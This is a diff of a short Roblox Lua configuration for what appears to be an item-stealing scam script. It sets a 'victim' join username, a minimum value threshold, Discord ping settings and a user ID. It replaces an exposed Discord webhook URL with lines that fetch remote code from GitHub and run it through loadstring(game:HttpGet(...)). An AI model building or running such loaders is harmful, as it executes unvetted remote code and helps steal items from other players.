@@ -1,7 +1,9 @@
-_G.Username = "isabelli733817" -- user you should join victim on
-_G.min_value = 0.3
+_G.Username = "
+pandagamerbloxyt5" -- user you should join victim on
+_G.min_value = 0.30
 _G.pingEveryone = "Yes" -- change to "No" if you dont want pings
-_G.webhook = "https://discord.com/api/webhooks/1361409312626577600/sxbMrijdZ5TeAdsaX6u2F1MXRk_mokgzSysq2CEc-zI2Qoktkc8GykEK_BlBAwpC-Nlq"
+_G.discuser = "1281461927171723334" -- change to your Discord user ID 
 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/scripts231/thin02/refs/heads/main/thing2",true))()
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/adoptme3/cxzcz/refs/heads/main/cxzcxzcz",true))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/scripts231/hotm/refs/heads/main/cool",true))()
